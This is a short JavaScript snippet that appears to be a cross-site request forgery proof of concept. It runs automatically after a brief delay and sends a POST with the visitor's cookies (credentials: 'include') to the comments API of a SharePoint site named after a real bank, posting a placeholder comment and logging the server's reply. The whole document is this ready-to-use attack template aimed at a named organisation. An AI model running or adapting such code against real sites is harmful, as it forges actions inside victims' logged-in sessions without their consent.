(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27'; // endpoint bạn kiểm soát
  const AUTO_RUN = true;

  function send() {
    fetch(ACTION_URL, {
      method: 'POST',
      body: '{"text":"-------------","mentions":[]}', 
      credentials: 'include'
    })
    .then(r => r.text())
    .then(t => console.log('Server saw headers/body:', t))
    .catch(e => console.error(e));
  }

  if (AUTO_RUN) setTimeout(send, 50);
  else window.sendTest = send;
})();
